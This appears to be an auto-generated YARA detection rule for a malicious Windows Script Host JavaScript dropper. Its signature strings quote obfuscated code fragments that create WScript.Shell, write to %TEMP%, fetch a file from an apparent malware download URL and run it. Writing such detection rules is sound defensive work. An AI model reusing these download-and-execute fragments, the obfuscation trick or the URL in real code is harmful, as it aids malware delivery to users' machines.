rule sig_20160427_74505de76c537e379b842bdfd8fec017 {
  meta:
    description = "datamaliciousorder - file 20160427_74505de76c537e379b842bdfd8fec017.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c644000729d445968f9127778e7f99f169b9da439ea7e4ea1e4180f85f77269c"

  strings:
    $s1  = "function WpdykNihzw() {return NcpwrBadxw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"I3zNNl4" ascii
    $s2  = "function WpdykNihzw() {return NcpwrBadxw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"I3zNNl4" ascii
    $s3  = "function FcqwzAvgmi(NrntsAbaks, RdfxcGlhiz){PhmrkSocet = PhmrkSocet * 1; return NrntsAbaks - RdfxcGlhiz;};" fullword ascii
    $s4  = "var NcpwrBadxw = function RwdixOduji() {return YtizaEjhet[RkhcyAuuio](\"WScript\"+\".Shell\");}(), BblaeIrwza = 11;" fullword ascii
    $s5  = "SdrwoMbjjf[FsorrSmpce](\"G\" + \"ET\", \"http://warcraft-lich-king.ru/i4ospd\", false);" fullword ascii
    $s6  = "var YtizaEjhet = this[\"WScript\"];" fullword ascii
    $s7  = "function MwhvdFyehv(){return CbejuUhudm + \"\";};" fullword ascii
    $s8  = "if (SdrwoMbjjf[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function XjrjyZysvm() {return ((EhifgWqyrn == true) && (EhifgWqyrn == CkfzaCbwuf)) ? 1 : PhmrkSocet;};" fullword ascii
    $s10 = "var EhifgWqyrn = false;" fullword ascii
    $s11 = "var CmljiSczxj = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "CkfzaCbwuf = true; " fullword ascii
    $s13 = "VhulzWlaqb = true;" fullword ascii
    $s14 = "EhifgWqyrn = true; " fullword ascii
    $s15 = "return FcqwzAvgmi(UwwnmEkbon, YrrmfDatzh);" fullword ascii
    $s16 = "function CctjvTtgjq(KhmaxMtnuq){NcpwrBadxw[\"R\"+\"un\"](KhmaxMtnuq, PhmrkSocet, PhmrkSocet);};" fullword ascii
    $s17 = "function SqlheCblgm(){return 23;};" fullword ascii
    $s18 = "function TqxwcGapoy(LovqaXmshr) {var FkbnqUqsip = (1, 2, 3, 4, 5, LovqaXmshr); return FkbnqUqsip;};" fullword ascii
    $s19 = "var VhulzWlaqb = false;" fullword ascii
    $s20 = "var CkfzaCbwuf = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}